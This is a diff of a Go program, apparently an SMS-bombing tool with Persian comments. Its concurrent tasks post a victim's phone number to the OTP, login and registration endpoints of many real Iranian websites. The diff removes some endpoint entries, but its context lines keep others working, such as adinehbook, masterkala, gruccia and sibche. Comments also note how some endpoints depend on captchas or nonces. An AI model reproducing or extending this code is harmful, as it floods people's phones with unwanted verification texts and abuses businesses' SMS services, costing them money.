@@ -391,16 +391,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// pirankalaco.ir (OTP - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("phone", phone) // فرمت 09...
-				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
-			}
-		}(client)
-
 		// api.vandar.io (Check/OTP - POST JSON)
 		// توجه: این نقطه پایانی نیاز به "captcha" دارد که بدون حل کپچا کار نخواهد کرد.
 		wg.Add(1)
@@ -412,25 +402,6 @@ cookieJar, _ := cookiejar.New(nil)
 					"captcha_provider": "CLOUDFLARE", // مقدار ثابت
 				}
 				sendJSONRequest(c, ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
-			}
-		}(client)
-
-		// dolichi.com (Login/Register - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("back", "my-account")
-				formData.Set("username", phone) // فرمت 09...
-				// فیلدهای دیگر از نمونه درخواست کاربر
-				formData.Set("id_customer", "") // مقدار پیش فرض
-				formData.Set("firstname", "نام") // مقدار نمونه
-				formData.Set("lastname", "خانوادگی") // مقدار نمونه
-				formData.Set("email", "example@example.com") // مقدار نمونه
-				formData.Set("password", "1234567890") // مقدار نمونه
-				formData.Set("action", "register") // مقدار ثابت
-				formData.Set("ajax", "1") // مقدار ثابت
-				sendFormRequest(c, ctx, "https://www.dolichi.com/login?back=my-account", formData, &wg, ch)
 			}
 		}(client)
 
@@ -476,18 +447,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// titomarket.com send_code (OTP - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") // مقدار ثابت
-				formData.Set("emailsend", "0") // مقدار ثابت
-				formData.Set("telephone", phone) // فرمت 09...
-				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
-			}
-		}(client)
-
 		// adinehbook.com sign-in (Login/OTP - POST Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -525,24 +484,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// narsisbeauty.com admin-ajax.php (OTP - POST Form)
-		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("phone_number", phone) // فرمت 09...
-				formData.Set("wupp_remember_me", "on") // مقدار ثابت
-				formData.Set("action", "wupp_sign_up") // مقدار ثابت
-				// فیلدهای دیگر Digits که ممکن است لازم باشند:
-				// formData.Set("countrycode", "+98")
-				// formData.Set("digits", "1")
-				// formData.Set("instance_id", "...") // ممکن است پویا باشد
-				// ...
-				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
-
 		// kapanigold.com admin-ajax.php (OTP - POST Form)
 		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
 		// توجه: csrf و dig_nounce ممکن است پویا باشند.
@@ -576,23 +517,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData := url.Values{}
 				formData.Set("email", phone) // از شماره تلفن به جای ایمیل استفاده شده
 				sendFormRequest(c, ctx, "https://skmei-iran.com/api/customer/member/register/", formData, &wg, ch)
-			}
-		}(client)
-
-		// api.123kif.com Register (Registration/OTP - POST JSON)
-		// توجه: نیاز به فیلدهای ثبت نام اضافه دارد.
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"mobile": phone, // فرمت 09...
-					"password": "testpassword123", // مقدار نمونه
-					"firstName": "Test", // مقدار نمونه
-					"lastName": "User", // مقدار نمونه
-					"platform": "web", // مقدار ثابت
-					"refferCode": "", // مقدار پیش فرض
-				}
-				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
 			}
 		}(client)
 
@@ -653,19 +577,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// hoomangold.com panel (Login/OTP - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("endp", "step-2") // مقدار ثابت
-				formData.Set("redirect_to", "") // مقدار پیش فرض
-				formData.Set("action", "nirweb_panel_login_form") // مقدار ثابت
-				formData.Set("nirweb_panel_username", phone) // فرمت 09...
-				sendFormRequest(c, ctx, "https://hoomangold.com/panel/?endp=step-2", formData, &wg, ch)
-			}
-		}(client)
-
 		// masterkala.com otp (OTP - POST JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -705,18 +616,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-
-		// davidjonesonline.ir login_request (Login/OTP - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"mobile_phone": phone, // فرمت 09...
-				}
-				sendJSONRequest(c, ctx, "https://davidjonesonline.ir/api/v1/sessions/login_request", payload, &wg, ch)
-			}
-		}(client)
-
 		// gruccia.ir login (Login/Register - POST Form)
 		// مشابه dolichi.com
 		wg.Add(1)
@@ -735,18 +634,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("action", "register") // مقدار ثابت
 				formData.Set("ajax", "1") // مقدار ثابت
 				sendFormRequest(c, ctx, "https://gruccia.ir/login?back=my-account", formData, &wg, ch)
-			}
-		}(client)
-
-		// vitrin.shop request_code (OTP - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone, // فرمت 09...
-					"forgot_password": false, // مقدار ثابت
-				}
-				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
 			}
 		}(client)
 
@@ -817,18 +704,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-
-		// gateway.joordaroo.com request-otp (OTP - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"mobile": phone, // فرمت 09...
-				}
-				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
-			}
-		}(client)
-
 		// api.beroozmart.com check-user (Check - POST JSON)
 		// این نقطه پایانی به نظر مرحله چک کردن وجود کاربر است و ممکن است به تنهایی OTP ارسال نکند.
 		wg.Add(1)
@@ -879,18 +754,6 @@ cookieJar, _ := cookiejar.New(nil)
 					"g-recaptcha-response": "PLACEHOLDER_RECAPTCHA_RESPONSE", // نیاز به حل کپچا
 				}
 				sendJSONRequest(c, ctx, "https://api.sibche.com/profile/sendCode", payload, &wg, ch)
-			}
-		}(client)
-
-		// bimebazar.com login_sec (OTP - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"username": phone, // فرمت 09...
-					"type": "sms", // مقدار ثابت
-				}
-				sendJSONRequest(c, ctx, "https://bimebazar.com/accounts/api/login_sec/", payload, &wg, ch)
 			}
 		}(client)
 
